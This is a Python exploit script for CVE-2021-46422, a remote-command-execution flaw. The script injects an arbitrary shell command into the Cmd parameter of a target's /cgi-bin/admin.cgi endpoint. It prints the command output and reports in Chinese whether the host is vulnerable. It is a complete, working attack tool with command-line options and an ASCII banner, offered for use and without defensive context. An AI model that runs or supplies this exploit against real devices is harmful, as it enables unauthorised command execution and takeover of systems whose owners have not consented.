import argparse
import textwrap

import requests

requests.packages.urllib3.disable_warnings()


def main(url, cmd):

    full_url = f"{url}/cgi-bin/admin.cgi?Command=sysCommand&Cmd={cmd}"
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
                     "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                     "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                     "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1",
                     "If-Modified-Since": "Mon, 24 Aug 2015 05:39:39 GMT", "If-None-Match": "\"-854243114\""}
    try:
        response = requests.get(full_url, headers=headers, allow_redirects=False, verify=False, timeout=5)
        print(response.text)
        if response.status_code == 200 and "CmdResult" in response.text:
            print(f'[+]{url}存在CVE-2021-46422漏洞')
            res = response.text.split('CmdResult')
            print(res[1].strip("><!/"))
        else:
            print(f'[-]{url}不存在CVE-2021-46422漏洞')
    except Exception:
        print(f'[-]{url}请求超时')


if __name__ == '__main__':
    banner = """ 
_____________   _______________         _______________   ________  ____             _____    ________   _____ ________ ________  
\_   ___ \   \ /   /\_   _____/         \_____  \   _  \  \_____  \/_   |           /  |  |  /  _____/  /  |  |\_____  \\_____  \ 
/    \  \/\   Y   /  |    __)_   ______  /  ____/  /_\  \  /  ____/ |   |  ______  /   |  |_/   __  \  /   |  |_/  ____/ /  ____/ 
\     \____\     /   |        \ /_____/ /       \  \_/   \/       \ |   | /_____/ /    ^   /\  |__\  \/    ^   /       \/       \ 
 \______  / \___/   /_______  /         \_______ \_____  /\_______ \|___|         \____   |  \_____  /\____   |\_______ \_______ \
        \/                  \/                  \/     \/         \/                   |__|        \/      |__|        \/       \/
    """
    print(banner)
    parser = argparse.ArgumentParser(description='CVE-2021-46422 rce exp',
                                     formatter_class=argparse.RawDescriptionHelpFormatter,
                                     epilog=textwrap.dedent('''example:
            CVE-2021-46422.py -u http://192.168.1.108 -c id
            '''))
    parser.add_argument("-u", "--url", dest="url", type=str, help=" example: http://www.mhx.com")
    parser.add_argument("-c", "--cmd", dest="cmd", type=str, default="id", help="default=id example: id")
    args = parser.parse_args()

    main(args.url, args.cmd)
